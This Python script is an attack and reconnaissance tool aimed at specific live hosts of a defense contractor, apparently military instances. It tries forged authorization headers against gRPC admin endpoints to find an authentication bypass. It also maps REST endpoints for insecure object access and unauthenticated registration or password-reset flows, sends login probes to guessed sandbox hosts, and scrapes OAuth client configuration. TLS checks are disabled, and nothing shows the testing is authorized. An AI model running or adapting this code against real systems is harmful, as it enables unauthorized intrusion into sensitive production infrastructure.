#!/usr/bin/env python3
"""
Pivot to genuinely new bug classes:
1. Cross-tenant token acceptance — does anduril-sandbox-authorization bypass military JWT middleware?
2. Developer portal REST API surface — map endpoints for IDOR, token lifecycle, org isolation
3. Unauthenticated state-changing actions — registration, password reset, invitation flows
4. Sandbox-to-production trust boundary — can developer tokens reach military gRPC?
"""
import struct, requests, json, re, urllib.parse
requests.packages.urllib3.disable_warnings()

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
S = requests.Session(); S.verify = False

def _vi(v):
    r = b""
    while True:
        b = v & 0x7F; v >>= 7
        r += bytes([b|0x80]) if v else bytes([b])
        if not v: break
    return r
def gf(b): return b"\x00" + struct.pack(">I", len(b)) + b
def ps(fn, s): v = s.encode(); return _vi((fn<<3)|2)+_vi(len(v))+v

def grpc(host, path, body=b"", extra_headers=None):
    hdr = {"User-Agent": UA, "Content-Type": "application/grpc-web+proto",
           "Accept": "application/grpc-web+proto", "X-Grpc-Web": "1"}
    if extra_headers:
        hdr.update(extra_headers)
    r = S.post(f"{host}/{path}", data=gf(body) if body else gf(b""),
               headers=hdr, timeout=8)
    gs = r.headers.get('grpc-status', '')
    gm = r.headers.get('grpc-message', '')
    for line in r.content.decode('latin1'):
        pass  # skip parse, use headers only
    # Parse trailer from body
    i = 0
    while i < len(r.content):
        if i + 5 > len(r.content): break
        ft = r.content[i]; ln = struct.unpack(">I", r.content[i+1:i+5])[0]
        frame = r.content[i+5:i+5+ln]; i += 5 + ln
        if ft == 0x80:
            for line in frame.decode('utf-8','replace').strip().split('\r\n'):
                if ':' in line:
                    k, v = line.split(':', 1)
                    if k.strip().lower() == 'grpc-status': gs = gs or v.strip()
                    if k.strip().lower() == 'grpc-message': gm = gm or v.strip()
    return r.status_code, gs, gm, r.content

PG = "https://proving-ground.anduril.com"
SB = "https://sandboxes.developer.anduril.com"
DEV = "https://developer.anduril.com"

print("=" * 70)
print("TEST 1: CROSS-TENANT HEADER BYPASS")
print("anduril-sandbox-authorization on military gRPC — does it bypass JWT check?")
print("=" * 70)

# The SDK documentation shows:
# Authorization: Bearer <lattice_jwt>        <- military JWT
# anduril-sandbox-authorization: Bearer <sandboxes_token>  <- developer token
#
# Question: does the military Envoy jwt_authn filter accept the sandbox header
# as an alternative authentication path?

test_headers_variants = [
    # Variant 1: Only sandbox header (no Authorization)
    ({"anduril-sandbox-authorization": "Bearer test-token-123"}, "sandbox-only header"),
    # Variant 2: Both headers (the SDK pattern)
    ({"Authorization": "Bearer invalid-jwt", "anduril-sandbox-authorization": "Bearer test"}, "both headers"),
    # Variant 3: Sandbox header with 'Authorization' key
    ({"Authorization": "Bearer sandbox:test-token-123"}, "Authorization with sandbox prefix"),
    # Variant 4: X-Sandbox-Authorization
    ({"X-Sandbox-Authorization": "Bearer test-token-123"}, "X-Sandbox-Authorization"),
    # Variant 5: anduril-authorization (variant spelling)
    ({"anduril-authorization": "Bearer test-token-123"}, "anduril-authorization"),
    # Variant 6: x-anduril-authorization
    ({"x-anduril-authorization": "Bearer test-token-123"}, "x-anduril-authorization"),
]

# Test on InsecureAuthAdmin/ListUsers — if bypass works, grpc-status would change from 16
for hdrs, label in test_headers_variants:
    status, gs, gm, content = grpc(PG, "anduril.auth.v2.InsecureAuthAdmin/ListUsers", b"", hdrs)
    changed = "*** DIFFERENT" if gs not in ['16', ''] else ""
    print(f"  [{gs}] {label}: {gm[:80]} {changed}")

# Also test on InsecureAuthAdmin — what happens with a sandbox header + valid-format JWT?
# Try the sandbox bypass on multiple military hosts
print("\n  Cross-host test (sandbox header only):")
for host_name, host in [("proving-ground", PG), ("usarmy", "https://usarmy.anduril.com"),
                         ("ghost", "https://ghost.anduril.com")]:
    hdrs = {"anduril-sandbox-authorization": "Bearer sbx-test-token"}
    status, gs, gm, content = grpc(host, "anduril.auth.v2.InsecureAuthAdmin/ListUsers", b"", hdrs)
    changed = "*** BYPASS" if gs == '0' else ("*** DIFFERENT ERR" if gs not in ['16', ''] else "")
    print(f"  {host_name} [{gs}]: {gm[:70]} {changed}")

print("\n" + "=" * 70)
print("TEST 2: DEVELOPER PORTAL REST API SURFACE MAPPING")
print("Focus: IDOR, token lifecycle, org/project isolation")
print("=" * 70)

api_paths = [
    # Auth / session
    ("GET", "/api/v1/auth/me"),
    ("GET", "/api/v1/auth/session"),
    ("GET", "/api/v1/me"),
    ("GET", "/api/v1/user"),
    ("GET", "/api/v1/profile"),
    # Sandboxes — the core object
    ("GET", "/api/v1/sandboxes"),
    ("GET", "/api/v1/sandboxes/1"),
    ("GET", "/api/v1/sandboxes/0"),
    ("GET", "/api/v1/sandbox"),
    ("GET", "/api/v1/sandbox/1"),
    # SDK / API keys
    ("GET", "/api/v1/tokens"),
    ("GET", "/api/v1/api-keys"),
    ("GET", "/api/v1/keys"),
    ("GET", "/api/v1/credentials"),
    # Orgs / teams
    ("GET", "/api/v1/organizations"),
    ("GET", "/api/v1/orgs"),
    ("GET", "/api/v1/teams"),
    ("GET", "/api/v1/members"),
    # Invitations
    ("GET", "/api/v1/invitations"),
    ("POST", "/api/v1/invitations"),
    # Registration
    ("POST", "/api/v1/register"),
    ("POST", "/api/v1/signup"),
    ("POST", "/api/v1/users"),
    ("POST", "/api/v1/auth/register"),
    # Password reset
    ("POST", "/api/v1/password-reset"),
    ("POST", "/api/v1/auth/forgot-password"),
    ("POST", "/api/v1/forgot-password"),
    ("GET", "/api/v1/password-reset"),
    # Admin
    ("GET", "/api/v1/admin/users"),
    ("GET", "/api/v1/admin/sandboxes"),
    # Webhooks
    ("GET", "/api/v1/webhooks"),
    # Health / status
    ("GET", "/api/v1/health"),
    ("GET", "/api/v1/status"),
    ("GET", "/health"),
    ("GET", "/healthz"),
]

print(f"\n  Mapping {len(api_paths)} endpoints on sandboxes.developer.anduril.com:")
interesting_endpoints = []
for method, path in api_paths:
    try:
        if method == "GET":
            r = S.get(f"{SB}{path}", headers={"User-Agent": UA}, timeout=6, allow_redirects=False)
        else:
            r = S.post(f"{SB}{path}", headers={"User-Agent": UA, "Content-Type": "application/json"},
                       json={}, timeout=6, allow_redirects=False)
        code = r.status_code
        ct = r.headers.get('content-type', '')
        # Interesting = not 404/302/301 to login, or returns JSON
        if code not in [404] and not (code in [301, 302] and '/login' in r.headers.get('location', '')):
            interesting_endpoints.append((method, path, code, ct, r.text[:200]))
            print(f"  *** [{code}] {method} {path}: {ct} | {r.text[:80]}")
        elif 'json' in ct:
            interesting_endpoints.append((method, path, code, ct, r.text[:200]))
            print(f"  [{code}] {method} {path}: {ct}")
    except Exception as e:
        pass

if not interesting_endpoints:
    print("  All paths → 404 or redirect-to-login")

print("\n" + "=" * 70)
print("TEST 3: UNAUTHENTICATED REGISTRATION FLOW")
print("Can we create a developer account? What token scope results?")
print("=" * 70)

# Check what the registration/login page actually looks like
r_login = S.get(f"{SB}/login", headers={"User-Agent": UA}, timeout=8, allow_redirects=True)
print(f"\n  Login page HTML (first 2000 chars):")
# Extract form fields, auth endpoints, CSRF tokens from the page
html = r_login.text
print(f"  Status: {r_login.status_code}, Content-Length: {len(html)}")

# Find forms
forms = re.findall(r'<form[^>]*>.*?</form>', html, re.DOTALL | re.IGNORECASE)
print(f"  Forms found: {len(forms)}")
for f in forms[:3]:
    inputs = re.findall(r'<input[^>]+>', f, re.IGNORECASE)
    action = re.search(r'action=["\']([^"\']*)["\']', f, re.IGNORECASE)
    method = re.search(r'method=["\']([^"\']*)["\']', f, re.IGNORECASE)
    print(f"    Form action={action.group(1) if action else 'N/A'} method={method.group(1) if method else 'N/A'}")
    for inp in inputs[:6]:
        name = re.search(r'name=["\']([^"\']*)["\']', inp, re.IGNORECASE)
        type_ = re.search(r'type=["\']([^"\']*)["\']', inp, re.IGNORECASE)
        print(f"      input: name={name.group(1) if name else '?'} type={type_.group(1) if type_ else '?'}")

# Find JavaScript API calls, auth endpoints in the page
api_calls = re.findall(r'(?:fetch|axios|xhr)[^;]{0,200}', html, re.IGNORECASE)
print(f"\n  JS API call patterns: {len(api_calls)}")
for c in api_calls[:5]:
    print(f"    {c[:150]}")

# Find auth0/okta references
auth_refs = re.findall(r'(?:auth0|okta|oauth|token|client_id)[^"\'\s]{0,100}', html, re.IGNORECASE)
print(f"\n  Auth references in page:")
for ref in list(set(auth_refs))[:10]:
    print(f"    {ref[:120]}")

# Find all URLs in the page
urls_in_page = re.findall(r'(?:href|src|action)=["\']([^"\']+)["\']', html, re.IGNORECASE)
print(f"\n  URLs/hrefs in page ({len(urls_in_page)} total):")
for u in sorted(set(urls_in_page))[:20]:
    if not u.startswith('#') and 'javascript' not in u.lower():
        print(f"    {u[:100]}")

print("\n" + "=" * 70)
print("TEST 4: SANDBOX-TO-PRODUCTION TRUST BOUNDARY")
print("Can sandbox instance tokens reach military Lattice gRPC?")
print("=" * 70)

# The SDK shows two separate token types:
# 1. lattice-client-id/secret -> access_token (military Lattice JWT)
# 2. sandboxes-token (separate header: anduril-sandbox-authorization)
#
# What if there's a sandbox Lattice instance (e.g., example.developer.anduril.com)
# that is IDENTICAL to military instances but accessible with developer tokens?
# And can those sandbox tokens cross into military?

sandbox_lattice_hosts = [
    "https://example.developer.anduril.com",   # Default SDK environment
    "https://lattice.developer.anduril.com",
    "https://sandbox.developer.anduril.com",
    "https://api.developer.anduril.com",
    "https://lattice-sandbox.anduril.com",
]

print("\n  Checking sandbox Lattice instance existence:")
for host in sandbox_lattice_hosts:
    try:
        # Try a gRPC call first
        status, gs, gm, content = grpc(host, "anduril.auth.v2.InternalIdp/LoginPassword",
                                        ps(1, "a@b.com") + ps(2, "x"))
        if gs in ['0', '16', '7', '3']:
            print(f"  ✓ {host}: gRPC [{gs}] {gm[:60]} (LIVE LATTICE)")
        else:
            # Try HTTP
            r = S.get(host, headers={"User-Agent": UA}, timeout=6, allow_redirects=False)
            print(f"  ? {host}: HTTP {r.status_code} gRPC [{gs}]")
    except Exception as e:
        print(f"  ✗ {host}: {type(e).__name__}")

print("\n" + "=" * 70)
print("TEST 5: DEVELOPER PORTAL OAUTH2 FLOW")
print("Map Auth0 application and check for token scope issues")
print("=" * 70)

# developer.anduril.com auth flow — what Auth0 client is used?
r_dev = S.get(DEV, headers={"User-Agent": UA}, timeout=8, allow_redirects=True)
html_dev = r_dev.text
print(f"\n  developer.anduril.com: {r_dev.status_code} ({len(html_dev)} bytes)")

# Find Auth0 config in the page
auth0_matches = re.findall(r'(?:clientId|client_id|domain|audience|scope)["\s:=]+["\']([^"\']{6,100})["\']', html_dev, re.IGNORECASE)
print("  Auth0 config values found:")
for m in set(auth0_matches)[:15]:
    print(f"    {m}")

# Find any window.__NEXT_DATA__ or similar embedded config
next_data = re.search(r'window\.__NEXT_DATA__\s*=\s*(\{.*?\})\s*;', html_dev, re.DOTALL)
if next_data:
    try:
        data = json.loads(next_data.group(1))
        print(f"\n  __NEXT_DATA__: {json.dumps(data, indent=2)[:500]}")
    except:
        print(f"  __NEXT_DATA__ (raw): {next_data.group(1)[:200]}")

# Find GraphQL endpoints
gql = re.findall(r'(?:graphql|/gql|__schema)', html_dev, re.IGNORECASE)
print(f"\n  GraphQL references: {gql[:5]}")

print("\n[DONE]")
